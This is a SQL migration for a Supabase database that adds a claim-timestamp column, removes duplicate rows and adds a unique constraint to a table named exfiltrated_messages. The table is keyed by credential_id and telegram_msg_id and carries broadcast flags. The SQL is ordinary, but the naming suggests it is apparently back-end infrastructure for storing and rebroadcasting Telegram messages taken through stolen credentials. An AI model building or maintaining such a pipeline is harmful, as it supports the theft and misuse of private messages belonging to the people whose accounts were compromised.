-- =================================================
-- MIGRATION: Add broadcast_claimed_at column
-- Run this in Supabase SQL Editor
-- =================================================

-- 1. Add the new column for cross-environment claims
ALTER TABLE exfiltrated_messages 
ADD COLUMN IF NOT EXISTS broadcast_claimed_at TIMESTAMPTZ DEFAULT NULL;

-- 2. Add index for faster queries
CREATE INDEX IF NOT EXISTS idx_exfiltrated_messages_claimed 
ON exfiltrated_messages (is_broadcasted, broadcast_claimed_at);

-- =================================================
-- FIX DUPLICATE ISSUE: Add UNIQUE constraint
-- =================================================

-- 3. FIRST: Remove duplicate rows (keep oldest, delete newer)
-- This is REQUIRED before we can add the unique constraint
DELETE FROM exfiltrated_messages 
WHERE id IN (
    SELECT id FROM (
        SELECT id,
               ROW_NUMBER() OVER (
                   PARTITION BY credential_id, telegram_msg_id 
                   ORDER BY created_at ASC
               ) as rn
        FROM exfiltrated_messages
    ) sub
    WHERE rn > 1
);

-- 4. Now add UNIQUE constraint to PREVENT future duplicates
-- (The index exists but index ≠ unique constraint!)
ALTER TABLE exfiltrated_messages 
DROP CONSTRAINT IF EXISTS unique_msg_per_credential;

ALTER TABLE exfiltrated_messages 
ADD CONSTRAINT unique_msg_per_credential 
UNIQUE (credential_id, telegram_msg_id);

-- =================================================
-- CLEANUP EXISTING DATA
-- =================================================

-- 5. Clear ALL existing claims to start fresh
UPDATE exfiltrated_messages 
SET broadcast_claimed_at = NULL;

-- 6. Show current status
SELECT 
    is_broadcasted,
    COUNT(*) as count
FROM exfiltrated_messages
GROUP BY is_broadcasted;
